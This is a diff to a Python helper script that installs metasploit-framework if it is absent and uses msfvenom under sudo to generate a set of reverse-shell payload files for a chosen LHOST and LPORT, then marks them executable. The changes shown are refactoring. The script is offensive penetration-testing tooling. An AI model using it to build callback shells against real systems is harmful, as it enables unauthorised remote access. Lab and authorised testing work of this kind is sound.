@@ -21,9 +21,8 @@ def ResetEnv():
 def MakeEnvFile():
 	os.makedirs(f"{HomePath}/shells", exist_ok=True)
 	if not os.path.isfile(EnvFile):
-		open(EnvFile, "w").close()
-	else:
-		return None
+		with open(EnvFile, "w"):
+			pass
 
 def CheckIsMSFVenomIsInstalled():
 	if shutil.which("msfvenom"):
@@ -71,8 +70,6 @@ def CheckAndGetEnvVariables():
 		GetAndSaveValidatedInputToEnv()
 	elif os.getenv("LHOST") is None or os.getenv("LPORT") is None:
 		GetAndSaveValidatedInputToEnv()
-	else:
-		return False
 
 def GenerateShells():
 	Payloads = {
@@ -97,26 +94,26 @@ def GenerateShells():
 	for FileName , Payload in tqdm(Payloads.items()):
 		try:
 			subprocess.run(["sudo", "msfvenom", "-p", Payload, f"LHOST={os.getenv('LHOST')}", f"LPORT={os.getenv('LPORT')}", "-f", "raw", "-o", f"{HomePath}/shells/{FileName}"], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL )
+			subprocess.run(["sudo", "chmod" , "u+x", f"{HomePath}/shells/{FileName}"])
 		except Exception as e:
 			print(f"Something went wrong: {e}")
 			sys.exit()
-	subprocess.run(f"sudo chmod u+x {HomePath}/shells/*", shell=True)
 	print(f"Shells are saved in {HomePath}/shells")
 
-if not CheckIsMSFVenomIsInstalled():
-	try:
-		print("Installing metasploit-framework...")
-		subprocess.run(["sudo", "apt" , "install", "-y" ,"metasploit-framework" ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-	except subprocess.CalledProcessError as e:
-		print(f"Something went wrong: {e}")
+if __name__ == "__main__":
+
+	if not CheckIsMSFVenomIsInstalled():
+		try:
+			print("Installing metasploit-framework...")
+			subprocess.run(["sudo", "apt" , "install", "-y" ,"metasploit-framework" ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+		except subprocess.CalledProcessError as e:
+			print(f"Something went wrong: {e}")
+			sys.exit()
+
+	if not CheckIsMSFVenomIsInstalled():
+		print("metasploit-framework installation failed")
 		sys.exit()
-else:
-	pass
 
-if not CheckIsMSFVenomIsInstalled():
-    print("metasploit-framework installation failed")
-    sys.exit()
-
-MakeEnvFile()
-CheckAndGetEnvVariables()
-GenerateShells()
+	MakeEnvFile()
+	CheckAndGetEnvVariables()
+	GenerateShells()
